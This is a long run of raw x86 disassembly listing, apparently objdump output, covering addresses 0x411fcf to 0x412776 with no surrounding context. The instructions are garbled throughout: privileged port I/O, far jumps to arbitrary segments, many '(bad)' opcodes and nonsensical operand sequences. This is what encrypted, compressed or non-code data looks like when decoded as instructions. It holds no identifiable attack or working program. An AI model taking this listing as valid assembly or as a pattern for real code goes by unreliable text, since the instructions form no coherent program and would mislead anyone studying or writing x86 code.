  411fcf:	add    ebp,DWORD PTR [esi+0x29]
  411fd2:	mov    eax,0xc4afe35f
  411fd7:	cmp    eax,0xc04fcad5
  411fdc:	jecxz  0x412053
  411fde:	fwait
  411fdf:	int3   
  411fe0:	int    0xd9
  411fe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fe3:	mov    bh,al
  411fe5:	inc    ebp
  411fe6:	out    dx,al
  411fe7:	or     DWORD PTR [edi-0x2f6d3888],ebp
  411fed:	fstp   st(0)
  411fef:	gs jb  0x411fdf
  411ff2:	retf   0x34c9
  411ff5:	sbb    dl,BYTE PTR [esi+0x394c8694]
  411ffb:	jle    0x412006
  411ffd:	cli    
  411ffe:	xor    BYTE PTR [esi-0x3416d91d],bl
  412004:	out    0x4,al
  412006:	in     eax,0xb4
  412008:	cli    
  412009:	jne    0x412044
  41200b:	repz inc edx
  41200d:	adc    eax,0x64544608
  412012:	outs   dx,BYTE PTR cs:[esi]
  412014:	addr16 and dl,al
  412017:	dec    esp
  412018:	in     al,dx
  412019:	fisttp QWORD PTR es:[ecx-0x41]
  41201d:	out    dx,eax
  41201e:	mov    al,0x48
  412020:	popa   
  412021:	and    DWORD PTR [esi],0xe616f155
  412027:	pushf  
  412028:	sar    BYTE PTR [edx],1
  41202a:	pop    ebp
  41202b:	push   ebp
  41202c:	and    DWORD PTR [eax],esp
  41202e:	outs   dx,BYTE PTR ds:[esi]
  41202f:	pop    ebp
  412030:	call   0x7b953855
  412035:	mov    cs,WORD PTR [esi]
  412037:	inc    eax
  412038:	mul    edi
  41203a:	ins    BYTE PTR es:[edi],dx
  41203b:	(bad)  
  41203c:	push   esi
  41203d:	inc    ebx
  41203e:	(bad)
  412041:	out    0x31,eax
  412043:	pop    edx
  412044:	xchg   edi,eax
  412045:	sbb    eax,DWORD PTR [ebx]
  412047:	jno    0x412093
  412049:	fwait
  41204a:	nop    DWORD PTR [eax+0x389cd8d3]
  412051:	int    0xea
  412053:	std    
  412054:	xlat   BYTE PTR ds:[ebx]
  412055:	ds push esp
  412057:	(bad)  
  412058:	jl     0x4120d4
  41205a:	adc    BYTE PTR [ebx-0xa5ad97],0x23
  412061:	or     dh,BYTE PTR [ecx]
  412063:	lods   al,BYTE PTR ds:[esi]
  412064:	stos   DWORD PTR es:[edi],eax
  412065:	sahf   
  412066:	mov    ebx,0xc52a8731
  41206b:	xor    BYTE PTR [edi-0x19],bh
  41206e:	sbb    ebp,ebx
  412070:	or     DWORD PTR [ebp+0x5d],0x29ed5eed
  412077:	push   es
  412078:	inc    ebp
  412079:	pop    esp
  41207a:	mov    ds:0x3e691106,eax
  41207f:	test   eax,0x9d788477
  412084:	push   es
  412085:	es in  eax,dx
  412087:	mov    eax,0x145d8691
  41208c:	inc    ecx
  41208d:	into   
  41208e:	xor    DWORD PTR [ebp-0x20],ebx
  412091:	adc    DWORD PTR [eax+0x55],esp
  412094:	test   DWORD PTR [ebp+0x19],edx
  412097:	cli    
  412098:	push   es
  412099:	push   esi
  41209a:	pop    ecx
  41209b:	cdq    
  41209c:	or     ebx,esp
  41209e:	add    eax,0xa55d2b42
  4120a3:	xor    DWORD PTR [esi],eax
  4120a5:	xlat   BYTE PTR ds:[ebx]
  4120a6:	shl    DWORD PTR [ebp-0x67],0x87
  4120aa:	pop    ss
  4120ab:	lock test eax,0x3f1860d8
  4120b1:	mov    cl,0xe2
  4120b3:	ins    BYTE PTR es:[edi],dx
  4120b4:	sbb    al,0xcb
  4120b6:	test   DWORD PTR [edx],ebx
  4120b8:	adc    bl,ah
  4120ba:	mov    bl,0x41
  4120bc:	adc    BYTE PTR [ecx+0x49],dh
  4120bf:	dec    eax
  4120c0:	dec    ebp
  4120c1:	repz (bad) 
  4120c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120c4:	fmul   DWORD PTR [edi]
  4120c6:	cmp    ebp,DWORD PTR [ebx]
  4120c8:	test   ecx,ebx
  4120ca:	xchg   edi,eax
  4120cb:	inc    BYTE PTR [esi+0x3b]
  4120ce:	cmp    eax,0xbca1944f
  4120d3:	fistp  QWORD PTR [edx]
  4120d5:	xor    ecx,ebx
  4120d7:	mov    esi,0x6049438c
  4120dc:	inc    esp
  4120dd:	gs dec esp
  4120df:	mov    dh,0x7f
  4120e1:	adc    DWORD PTR [edi+0x55ce86df],esi
  4120e7:	fstp   TBYTE PTR [ecx+0x1d]
  4120ea:	mov    al,ds:0x91900cfe
  4120ef:	sti    
  4120f0:	sub    eax,0xd8165013
  4120f5:	jge    0x4120fd
  4120f7:	push   ecx
  4120f8:	sub    eax,0x5abb9872
  4120fd:	nop
  4120fe:	inc    esi
  4120ff:	popa   
  412100:	les    ebp,FWORD PTR [eax+ecx*2]
  412103:	retf   0x7f2a
  412106:	sub    esi,edi
  412108:	mov    dh,0xec
  41210a:	inc    ebp
  41210b:	mov    ebx,0x90987760
  412110:	sbb    BYTE PTR [ebp+0xe],al
  412113:	inc    esp
  412114:	scas   al,BYTE PTR es:[edi]
  412115:	clc    
  412116:	push   eax
  412117:	pop    ss
  412118:	mov    esi,0xb3421b6f
  41211d:	cwde   
  41211e:	inc    eax
  41211f:	out    dx,eax
  412120:	out    dx,eax
  412121:	loopne 0x412175
  412123:	out    dx,al
  412124:	repnz out dx,al
  412126:	arpl   dx,si
  412128:	xchg   edx,eax
  412129:	sbb    DWORD PTR gs:[ebx+eax*8-0x95933f5],edx
  412131:	dec    ebx
  412132:	imul   esi,DWORD PTR [ebp+0x45854c5d],0xefdd9c6d
  41213c:	sti    
  41213d:	or     DWORD PTR [ebp+0x1f],edi
  412140:	push   ds
  412141:	idiv   cl
  412143:	sbb    DWORD PTR [ebx],ebp
  412145:	and    al,0x97
  412147:	mov    al,0xb6
  412149:	add    ah,BYTE PTR [edi]
  41214b:	imul   DWORD PTR [esp+esi*2]
  41214e:	fnstcw WORD PTR [ecx*8-0x41a01122]
  412155:	pop    esp
  412156:	fcom   st(0)
  412158:	fadd   DWORD PTR [eax-0x22]
  41215b:	xor    BYTE PTR [esi-0x4944dea1],0xdd
  412162:	adc    esp,DWORD PTR [edx+0x76]
  412165:	leave  
  412166:	pop    ds
  412167:	and    dh,BYTE PTR ds:0x9de499c3
  41216d:	dec    esi
  41216e:	fst    QWORD PTR [edx]
  412170:	jne    0x412147
  412172:	or     BYTE PTR fs:[esi-0x5c769343],cl
  412179:	mov    dh,0xf4
  41217b:	push   ebx
  41217c:	sub    eax,0x67bb4754
  412181:	stc    
  412182:	add    eax,0x294c104
  412187:	rcr    DWORD PTR [ecx-0x75e1f253],1
  41218d:	mov    cl,0x77
  41218f:	aas    
  412190:	fist   WORD PTR [eax-0x38]
  412193:	aam    0xd7
  412195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412196:	xchg   DWORD PTR [ebx+0x22],edi
  412199:	xlat   BYTE PTR ds:[ebx]
  41219a:	add    esi,DWORD PTR [edx-0x24]
  41219d:	sahf   
  41219e:	stos   BYTE PTR es:[edi],al
  41219f:	jae    0x412198
  4121a1:	pusha  
  4121a2:	pop    ebp
  4121a3:	scas   eax,DWORD PTR es:[edi]
  4121a4:	dec    eax
  4121a5:	adc    eax,0xf724d368
  4121aa:	and    DWORD PTR [esp+edx*8+0x7d],esp
  4121ae:	mov    ch,0x9e
  4121b0:	repz mov ds,ebp
  4121b3:	bound  eax,QWORD PTR [ebx+ebx*1+0x9]
  4121b7:	jns    0x412197
  4121b9:	or     al,0xda
  4121bb:	jo     0x412171
  4121bd:	add    eax,0x93cdd0ec
  4121c2:	or     dh,bl
  4121c4:	lock xacquire inc BYTE PTR ds:0xffc7cdbf
  4121cc:	xchg   esi,eax
  4121cd:	push   es
  4121ce:	cmp    ah,ah
  4121d0:	leave  
  4121d1:	ret    
  4121d2:	pusha  
  4121d3:	mov    DWORD PTR [edi],esp
  4121d5:	retf   
  4121d6:	ds std 
  4121d8:	iret   
  4121d9:	jp     0x412207
  4121db:	mov    ah,0x95
  4121dd:	enter  0xc729,0x9
  4121e1:	loop   0x41216c
  4121e3:	mov    ds:0xb48a0bd4,al
  4121e8:	or     ebp,ebp
  4121ea:	sbb    DWORD PTR [eax+0x1c],ebp
  4121ed:	adc    BYTE PTR [edx-0x5d],dh
  4121f0:	arpl   WORD PTR [ecx+0x64],bx
  4121f3:	inc    edi
  4121f4:	repnz repnz pushf 
  4121f7:	out    dx,eax
  4121f8:	push   eax
  4121f9:	and    edi,ecx
  4121fb:	push   ss
  4121fc:	jl     0x412220
  4121fe:	mov    ds:0xace1dfb2,al
  412203:	jg     0x412213
  412205:	dec    ebp
  412206:	adc    dh,BYTE PTR [ebp+ebp*1+0x59]
  41220a:	add    BYTE PTR [ecx-0x7d345d3f],ch
  412210:	and    al,0x31
  412212:	add    DWORD PTR [edi],ebx
  412214:	inc    esi
  412215:	pop    es
  412216:	pop    edx
  412217:	stos   BYTE PTR es:[edi],al
  412218:	push   esp
  412219:	ds mov dl,bl
  41221c:	push   esi
  41221d:	idiv   DWORD PTR [ebx-0x14]
  412220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412221:	(bad)  
  412222:	jns    0x412240
  412224:	sbb    bh,bl
  412226:	xchg   esi,eax
  412227:	push   eax
  412228:	jp     0x412295
  41222a:	xchg   BYTE PTR [ecx-0x28],ah
  41222d:	jmp    0x4122a4
  41222f:	test   DWORD PTR [eax],ebx
  412231:	mov    edi,0x9c1cf2d2
  412236:	(bad)  
  412238:	rcl    BYTE PTR [ecx-0x38],0xf3
  41223c:	jge    0x4121e9
  41223e:	int    0x65
  412240:	dec    edi
  412241:	pop    es
  412242:	xchg   ecx,eax
  412243:	je     0x412281
  412245:	fnstsw WORD PTR [edx-0x8]
  412248:	aam    0xe4
  41224a:	xor    al,BYTE PTR ds:0x30203853
  412250:	ret    0xdf29
  412253:	and    DWORD PTR [ebp-0x23fd0d95],esp
  412259:	dec    edx
  41225a:	pcmpgtb mm5,mm3
  41225d:	sbb    DWORD PTR [ebx+eiz*2-0x3d7f36c3],ebp
  412264:	jne    0x4121e7
  412266:	stos   BYTE PTR es:[edi],al
  412267:	inc    edx
  412268:	jne    0x4122e7
  41226a:	aad    0x72
  41226c:	popf   
  41226d:	test   eax,0x35905627
  412272:	out    dx,eax
  412273:	call   0x8526939f
  412278:	mov    DWORD PTR [ebx-0x19],edi
  41227b:	or     esp,esi
  41227d:	adc    dh,BYTE PTR ds:0x22aca8ef
  412283:	shl    bl,0xb7
  412286:	adc    ebp,ebx
  412288:	fisubr WORD PTR [ecx+0xe]
  41228b:	sub    DWORD PTR [esi-0x7f],ecx
  41228e:	xchg   edi,eax
  41228f:	out    dx,al
  412290:	sbb    ebp,DWORD PTR [edx+0x17792e74]
  412296:	mov    esi,0xcea3efd1
  41229b:	out    dx,eax
  41229c:	scas   eax,DWORD PTR es:[edi]
  41229d:	cmp    al,0x8a
  41229f:	mov    esi,0x9088e84e
  4122a4:	pop    esi
  4122a5:	stc    
  4122a6:	ror    ecx,0x91
  4122a9:	sbb    ah,ch
  4122ab:	fcmovnb st,st(7)
  4122ad:	fist   DWORD PTR [edi-0x31]
  4122b0:	sti    
  4122b1:	out    dx,al
  4122b2:	xchg   edx,eax
  4122b3:	js     0x4122f4
  4122b5:	out    dx,al
  4122b6:	xor    eax,0x5a04e3d4
  4122bb:	mov    ch,dl
  4122bd:	or     DWORD PTR [eax+0x1d],ebp
  4122c0:	mov    al,BYTE PTR [ecx]
  4122c2:	add    DWORD PTR [eax],0x5ec815d4
  4122c8:	mov    al,ds:0xb7a79ef0
  4122cd:	in     al,dx
  4122ce:	adc    edx,edi
  4122d0:	inc    ebp
  4122d2:	idiv   BYTE PTR [ebx]
  4122d4:	inc    esi
  4122d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122d6:	pcmpgtd mm1,QWORD PTR [ebx-0x47]
  4122da:	xor    al,0x75
  4122dc:	xor    eax,0x8b071ff
  4122e1:	jmp    0xd60c:0x753e362b
  4122e8:	push   esp
  4122e9:	xchg   esp,eax
  4122ea:	mov    BYTE PTR [esi],dl
  4122ec:	dec    esi
  4122ed:	push   0x96711da1
  4122f2:	sub    al,0x65
  4122f4:	mov    esp,0x4d2a0739
  4122f9:	sbb    edx,0x22
  4122fc:	xchg   DWORD PTR [ebx],edx
  4122fe:	xchg   ebx,eax
  4122ff:	pop    esp
  412300:	dec    esp
  412301:	push   esi
  412302:	sbb    dl,BYTE PTR [ebx-0x5435b5ce]
  412308:	mov    WORD PTR [ebx-0x36],es
  41230b:	jle    0x412312
  41230d:	adc    ebp,DWORD PTR [eax+0xf]
  412310:	lea    edi,[edi]
  412312:	cmp    eax,0x1803fd4f
  412317:	cmp    esi,DWORD PTR [edx+0x33b94c79]
  41231d:	xchg   esp,eax
  41231e:	addr16 push ecx
  412320:	and    ch,BYTE PTR fs:[ebx-0x19]
  412324:	pop    edx
  412325:	(bad)  
  412327:	push   eax
  412328:	mov    WORD PTR [edi],ss
  41232a:	jbe    0x41235b
  41232c:	stc    
  41232d:	bound  eax,QWORD PTR ds:0xdd59a077
  412333:	mov    edi,eax
  412335:	xchg   esi,eax
  412336:	pop    eax
  412337:	jnp    0x412370
  412339:	and    BYTE PTR [ebp-0x1d],dh
  41233c:	mov    dl,0x38
  41233e:	push   0x14737f37
  412343:	imul   ebx,DWORD PTR ds:0x468a01da,0x701c1541
  41234d:	mov    edx,0xcd83c445
  412352:	dec    ebx
  412353:	xchg   ebx,eax
  412354:	lea    edx,[ebp+edx*2-0x23684609]
  41235b:	mov    eax,0x55ab7a9f
  412360:	retf   
  412361:	add    BYTE PTR [esi+0x6d731f08],0xfb
  412368:	adc    eax,0xbe065649
  41236d:	pop    ebx
  41236e:	ins    DWORD PTR es:[edi],dx
  41236f:	mov    ch,0xf4
  412371:	jne    0x412312
  412373:	pushf  
  412374:	lea    esi,[ebx+0x46]
  412377:	mov    cl,0xb6
  412379:	lds    edx,FWORD PTR [edi-0x47]
  41237c:	loop   0x4123bd
  41237e:	shr    DWORD PTR [edi-0x35fb340c],cl
  412384:	dec    ecx
  412385:	outs   dx,DWORD PTR ds:[esi]
  412386:	xchg   esp,eax
  412387:	test   ch,ah
  412389:	xor    al,0x88
  41238b:	enter  0xcdf8,0x80
  41238f:	jmp    0x4123ca
  412391:	cmp    al,0xc2
  412393:	mov    ebx,0x5ee4150c
  412398:	mov    eax,ds:0xf9fa1539
  41239d:	jl     0x412386
  41239f:	sbb    bl,ch
  4123a1:	pop    eax
  4123a2:	addr16 imul ch
  4123a5:	pop    ss
  4123a6:	aas    
  4123a7:	ss adc eax,0xc0b5042a
  4123ad:	jno    0x41232f
  4123af:	dec    ebp
  4123b0:	add    bl,BYTE PTR [ecx]
  4123b2:	dec    ecx
  4123b3:	fs xor al,0x8b
  4123b6:	pop    ecx
  4123b7:	xchg   esp,ebp
  4123b9:	sub    esp,0x51f71e58
  4123bf:	add    DWORD PTR [ebx-0x4bc53f27],ecx
  4123c5:	or     esp,DWORD PTR [ebp-0xa]
  4123c8:	nop
  4123c9:	int    0x95
  4123cb:	xchg   ecx,eax
  4123cc:	jg     0x4123e5
  4123ce:	imul   ebx,ebp,0xffffffff
  4123d1:	retf   0x5d61
  4123d4:	(bad)  
  4123d5:	jmp    0xb7af:0xe7f96eab
  4123dc:	adc    DWORD PTR [edi],ecx
  4123de:	xor    al,0xda
  4123e0:	jp     0x41240b
  4123e2:	mov    esp,0x1796930d
  4123e7:	sbb    ah,BYTE PTR [ebx]
  4123e9:	(bad)  
  4123ea:	ror    DWORD PTR [eax],cl
  4123ec:	mov    bl,0x9b
  4123ee:	fsub   DWORD PTR [eax]
  4123f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123f1:	sbb    BYTE PTR [edi],bh
  4123f3:	cmp    edx,DWORD PTR [esi+ebx*2+0x4ac12167]
  4123fa:	mov    ebp,0xab52e808
  4123ff:	je     0x412413
  412401:	loope  0x4123e8
  412403:	int    0xa3
  412405:	or     eax,0x5adc3703
  41240a:	mov    dl,0xb4
  41240c:	fnstcw WORD PTR [ebx]
  41240e:	fcom   QWORD PTR [edx+edx*2]
  412411:	int3   
  412412:	pop    es
  412413:	shl    DWORD PTR [esi],0xf9
  412416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412417:	sti    
  412418:	arpl   WORD PTR [ebp+0x1a0076bd],bx
  41241e:	call   0x793771be
  412423:	call   0x58b0:0xc5730724
  41242a:	cli    
  41242b:	nop
  41242c:	fcmovnb st,st(3)
  41242e:	add    ch,al
  412430:	(bad)  
  412432:	push   ebp
  412433:	mov    esi,0x2423fae9
  412438:	fucomp st(1)
  41243a:	inc    eax
  41243b:	pop    ebx
  41243c:	xor    al,0x97
  41243e:	sub    esp,DWORD PTR [eax-0x14fbfd7d]
  412444:	mov    eax,ds:0x1f85686b
  412449:	jmp    0x202aabc1
  41244e:	cdq    
  41244f:	mov    dl,0x1
  412451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412452:	(bad)  
  412453:	call   0xd1a9:0xc6723a60
  41245a:	leave  
  41245b:	test   esi,eax
  41245d:	push   eax
  41245e:	mov    edx,esp
  412460:	xor    eax,DWORD PTR ds:0xe989a7d1
  412466:	mov    ?,ebp
  412468:	push   ds
  412469:	ds mov dh,0x60
  41246c:	in     eax,0xed
  41246e:	addr16 nop
  412470:	(bad)  
  412471:	and    DWORD PTR [ebp+ebp*2+0x7c],esi
  412475:	je     0x41240b
  412477:	xlat   BYTE PTR ds:[bx]
  412479:	mov    esi,DWORD PTR [edx-0x74]
  41247c:	jge    0x412492
  41247e:	sub    DWORD PTR [ecx+0x1c],edx
  412481:	lods   eax,DWORD PTR ds:[esi]
  412482:	mov    DWORD PTR [eax-0x54e446dc],ecx
  412488:	cli    
  412489:	xchg   BYTE PTR [edi-0x49],bh
  41248c:	fcmovnb st,st(3)
  41248e:	add    BYTE PTR [esi-0x23],ah
  412491:	sbb    BYTE PTR [ebx-0x597596fe],ch
  412497:	rcl    DWORD PTR [esp+edi*2-0x62],cl
  41249b:	ins    BYTE PTR es:[edi],dx
  41249c:	(bad)  
  41249e:	xchg   BYTE PTR [ecx+0x646ab6d3],dl
  4124a4:	adc    al,0xf2
  4124a6:	ud2    
  4124a8:	cld    
  4124a9:	xchg   BYTE PTR [ebp-0x21],al
  4124ac:	(bad)  
  4124ad:	(bad)  
  4124af:	pop    eax
  4124b0:	jle    0x412503
  4124b2:	pop    eax
  4124b3:	jnp    0x412444
  4124b5:	mov    cl,0x39
  4124b7:	js     0x4124d9
  4124b9:	sub    BYTE PTR [esp+ecx*8-0x52],ah
  4124bd:	push   0xfffffff8
  4124bf:	and    BYTE PTR [ebx-0x5fc5b1cb],bh
  4124c5:	push   ebx
  4124c6:	std    
  4124c7:	cmp    ah,BYTE PTR [eax]
  4124c9:	data16 xor dh,BYTE PTR [ebx+0x17c1b68a]
  4124d0:	add    DWORD PTR [ecx+0x10],ebx
  4124d3:	dec    edx
  4124d4:	mov    ebx,0x1fbd144e
  4124d9:	popa   
  4124da:	aam    0xbf
  4124dc:	xchg   esi,eax
  4124dd:	lock mov dh,0xa5
  4124e0:	lock test eax,ecx
  4124e3:	sbb    al,0xca
  4124e5:	pop    ds
  4124e6:	add    BYTE PTR [edx+edi*2+0x3d],dh
  4124ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124eb:	pushf  
  4124ec:	and    ecx,0x51
  4124ef:	and    esi,esi
  4124f1:	sbb    esi,edx
  4124f3:	sub    DWORD PTR [ebx],ecx
  4124f5:	shl    BYTE PTR [edi+0xb],1
  4124f8:	jmp    0x3369:0x7067c100
  4124ff:	add    ecx,DWORD PTR [ebx-0x151b346f]
  412505:	ret    0xf39c
  412508:	lahf   
  412509:	cdq    
  41250a:	jp     0x4124b1
  41250c:	push   0x5a
  41250e:	jne    0x412573
  412510:	xchg   esi,eax
  412511:	enter  0xb491,0x7
  412515:	xchg   esi,eax
  412516:	cmp    ah,BYTE PTR [esi-0x22396413]
  41251c:	add    eax,0x83c9cc10
  412521:	jmp    0x4ec:0x22ee09da
  412528:	lea    edi,[edi+eiz*1]
  41252b:	sbb    bl,BYTE PTR [ebx]
  41252d:	lods   eax,DWORD PTR ds:[esi]
  41252e:	test   BYTE PTR [edx+0x75d1cabd],0x7a
  412535:	rcl    DWORD PTR [eax],0x6f
  412538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412539:	sbb    al,0xb3
  41253b:	test   al,0xd
  41253d:	sar    DWORD PTR [eax+0x0],cl
  412540:	adc    BYTE PTR [ebx+0x2b08de96],0x62
  412547:	adc    eax,0x784c42b7
  41254c:	mov    DWORD PTR ds:0x48f4fe93,esp
  412552:	jnp    0x41254b
  412554:	les    ebx,FWORD PTR [ecx-0x33ea8c4]
  41255a:	add    eax,edx
  41255c:	mov    al,BYTE PTR [esi]
  41255e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41255f:	add    DWORD PTR [ebx+0x502cbab2],eax
  412565:	dec    BYTE PTR [eax+edi*2-0x29]
  412569:	mov    ah,0xa0
  41256b:	int3   
  41256c:	sub    edi,DWORD PTR [ebx]
  41256e:	mov    ch,0xca
  412570:	(bad)
  412573:	jns    0x41250e
  412575:	jno    0x412550
  412577:	call   0x4593:0x47631034
  41257e:	push   ss
  41257f:	in     al,0xf5
  412581:	cdq    
  412582:	mov    ds:0x66712a78,al
  412587:	mov    ch,0x37
  412589:	dec    ebp
  41258a:	fcom   DWORD PTR [edi]
  41258c:	add    DWORD PTR [edx+ecx*4],ebx
  41258f:	(bad)  
  412590:	cmp    DWORD PTR [edx],esi
  412592:	or     al,0x3c
  412594:	xchg   esp,edi
  412596:	cdq    
  412597:	(bad)  
  412598:	jg     0x412543
  41259a:	mov    edx,0x41086170
  41259f:	int3   
  4125a0:	mov    BYTE PTR [edi-0x1bc6f5e4],0xf5
  4125a7:	add    al,0xe9
  4125a9:	cmp    al,0x7
  4125ab:	rcl    BYTE PTR cs:[eax-0x5b],0x8d
  4125b0:	int    0xae
  4125b2:	mov    ds:0xaa0a363c,eax
  4125b7:	psubw  mm5,QWORD PTR [eax-0x29a5f3a7]
  4125be:	jo     0x412552
  4125c0:	jne    0x4125ed
  4125c2:	loop   0x4125ff
  4125c4:	outs   dx,BYTE PTR ds:[esi]
  4125c5:	je     0x412599
  4125c7:	and    BYTE PTR [esi+0x24],ah
  4125ca:	cmp    dl,BYTE PTR [esi+0x65]
  4125cd:	adc    BYTE PTR [ebp-0x38],0x85
  4125d1:	pop    esp
  4125d2:	jno    0x4125cb
  4125d4:	enter  0xdae4,0x20
  4125d8:	out    dx,al
  4125d9:	pop    es
  4125da:	jne    0x412641
  4125dc:	jnp    0x41260c
  4125de:	mov    BYTE PTR [edx],bl
  4125e0:	loopne 0x412566
  4125e2:	into   
  4125e3:	(bad)  
  4125e4:	xor    DWORD PTR [edi],edi
  4125e6:	test   eax,0x9896f1e4
  4125eb:	(bad)  
  4125ed:	shl    ah,1
  4125ef:	inc    ecx
  4125f0:	jge    0x412576
  4125f2:	xchg   ecx,eax
  4125f3:	sti    
  4125f4:	mov    edi,0x74a683ae
  4125f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125fb:	pop    ss
  4125fc:	test   cl,ch
  4125fe:	jg     0x412663
  412600:	xchg   ebx,eax
  412601:	mov    cl,0xb4
  412603:	loope  0x4125e5
  412605:	dec    edx
  412606:	adc    al,0xf8
  412608:	xlat   BYTE PTR ds:[ebx]
  412609:	loop   0x4125af
  41260b:	icebp  
  41260c:	sti    
  41260d:	and    al,0xa7
  41260f:	dec    edx
  412610:	mov    ch,0x2e
  412612:	das    
  412613:	xchg   DWORD PTR [esi-0x4b],edi
  412616:	sbb    dl,BYTE PTR [edx-0x14]
  412619:	mov    edx,0x74695488
  41261e:	jle    0x412696
  412620:	scas   eax,DWORD PTR es:[edi]
  412621:	mov    ebp,0x2eef9823
  412626:	cmp    edx,DWORD PTR [ebp+0x38]
  412629:	add    dh,ah
  41262b:	cmp    eax,0xdea68de0
  412630:	(bad)  
  412632:	stc    
  412633:	lock icebp 
  412635:	pop    edi
  412636:	mov    ebp,0x63db40c9
  41263b:	jge    0x4125ed
  41263d:	inc    edx
  41263e:	jo     0x412648
  412640:	int    0xab
  412642:	xchg   DWORD PTR [ecx-0x56],esp
  412645:	jmp    FWORD PTR [edx+0x51]
  412648:	jg     0x4125ca
  41264a:	add    eax,0x2c846433
  41264f:	cmp    al,0x50
  412651:	dec    ebp
  412652:	xchg   BYTE PTR [ecx],cl
  412654:	xchg   esp,eax
  412655:	mov    WORD PTR [esi],fs
  412657:	inc    esp
  412658:	ss or  eax,0x1f3d383c
  41265e:	mov    ch,0x71
  412661:	jmp    FWORD PTR [ecx+0xb0a445f]
  412667:	data16 sar BYTE PTR [esi+0x16],cl
  41266b:	fisttp QWORD PTR [eax+0x5ed58e61]
  412671:	cmp    BYTE PTR [edx-0xd],ah
  412674:	leave  
  412675:	adc    ch,dl
  412677:	fisubr DWORD PTR [edi+0x53]
  41267a:	loope  0x4126a1
  41267c:	(bad)  
  41267d:	aad    0x69
  41267f:	rsm    
  412681:	jns    0x4126bf
  412683:	adc    BYTE PTR [edi],ch
  412685:	cmc    
  412686:	jae    0x4126ec
  412688:	sub    al,0xa8
  41268a:	mov    cl,0xca
  41268c:	pop    ebp
  41268d:	out    0x30,al
  41268f:	inc    ebx
  412690:	lods   eax,DWORD PTR ds:[esi]
  412691:	xchg   edi,eax
  412692:	adc    DWORD PTR [edi],ecx
  412694:	scas   eax,DWORD PTR es:[edi]
  412695:	and    BYTE PTR [edx],dh
  412697:	into   
  412698:	arpl   WORD PTR [edi],si
  41269a:	stos   BYTE PTR es:[edi],al
  41269b:	xchg   edx,eax
  41269c:	dec    edx
  41269d:	mov    DWORD PTR [ebx],ecx
  41269f:	push   ds
  4126a0:	stc    
  4126a1:	cmp    eax,0xe87d30e5
  4126a6:	or     al,0xb4
  4126a8:	fwait
  4126a9:	push   eax
  4126aa:	push   edi
  4126ab:	(bad)  
  4126ac:	mov    ecx,0x39484ca9
  4126b1:	jno    0x4126b2
  4126b3:	mov    BYTE PTR [ecx-0x4a59fd6],dl
  4126b9:	add    BYTE PTR [esi+0xebdae99],0x9b
  4126c0:	mov    WORD PTR [ebp+0x6c553f2c],cs
  4126c6:	shl    BYTE PTR [ebp+ebp*8+0x3d],1
  4126ca:	aam    0xf7
  4126cc:	data16 outs dx,BYTE PTR ds:[esi]
  4126ce:	push   ds
  4126cf:	int    0xe
  4126d1:	aad    0xe4
  4126d3:	jle    0x41269c
  4126d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126d6:	adc    eax,0xe55c3715
  4126db:	push   0xffffffb9
  4126dd:	jge    0x412671
  4126df:	fwait
  4126e0:	jecxz  0x4126cd
  4126e2:	jge    0x4126a0
  4126e4:	scas   eax,DWORD PTR es:[edi]
  4126e5:	add    dh,BYTE PTR [edi+0x5f]
  4126e8:	push   eax
  4126e9:	push   ds
  4126ea:	mov    esi,0xbc03a24
  4126ef:	enter  0x3c46,0x9b
  4126f3:	cmp    ebx,DWORD PTR [esi-0x3c5b7665]
  4126f9:	mov    edx,0xb3506e3f
  4126fe:	les    ebp,FWORD PTR es:[edx-0x27c3d47f]
  412705:	stos   BYTE PTR es:[edi],al
  412706:	imul   ecx,DWORD PTR [ebp+0x5b],0xffffff9e
  41270a:	fucom  st(3)
  41270c:	jae    0x412715
  41270e:	lahf   
  41270f:	stos   BYTE PTR es:[edi],al
  412710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412711:	inc    edx
  412712:	sub    al,0x17
  412714:	jge    0x4126e6
  412716:	sub    BYTE PTR [eax-0x1893b8bc],bh
  41271c:	mov    WORD PTR [edx],?
  41271e:	out    dx,eax
  41271f:	lds    eax,FWORD PTR [ebp-0x1fe1e3e9]
  412725:	jns    0x4126eb
  412727:	popf   
  412728:	add    al,BYTE PTR [edi+0x45]
  41272b:	and    eax,DWORD PTR [edx]
  41272d:	div    dh
  41272f:	and    edx,DWORD PTR [eax-0x4b]
  412732:	leave  
  412733:	std    
  412734:	cmp    al,0x14
  412736:	mov    edx,0x1dc5dbde
  41273b:	loopne 0x412774
  41273d:	rcr    BYTE PTR [ecx],cl
  41273f:	rcr    bh,cl
  412741:	cmp    DWORD PTR [ebx+ecx*8],esp
  412744:	ficomp WORD PTR [esi]
  412746:	pop    esp
  412747:	mov    ss,WORD PTR [eax]
  412749:	ins    DWORD PTR es:[edi],dx
  41274a:	ins    DWORD PTR es:[edi],dx
  41274b:	mov    bh,0x52
  41274d:	scas   eax,DWORD PTR es:[edi]
  41274e:	push   ebx
  41274f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412750:	popf   
  412751:	sub    edi,edi
  412753:	push   ecx
  412754:	out    dx,eax
  412755:	cld    
  412756:	test   al,0xb0
  412758:	(bad)  
  412759:	ja     0x4126e3
  41275b:	outs   dx,BYTE PTR ds:[esi]
  41275c:	in     eax,dx
  41275d:	loopne 0x4126eb
  41275f:	pop    ebp
  412760:	and    al,0xd2
  412762:	out    0x34,al
  412764:	int3   
  412765:	imul   esi,DWORD PTR [ebx],0xffffffed
  412768:	in     eax,dx
  412769:	jmp    DWORD PTR [ebx-0x6e]
  41276c:	and    cl,al
  41276e:	jge    0x412708
  412770:	hlt    
  412771:	sbb    DWORD PTR [edx+eiz*2],0xfffffff7
  412775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412776:	jl     0x41270c
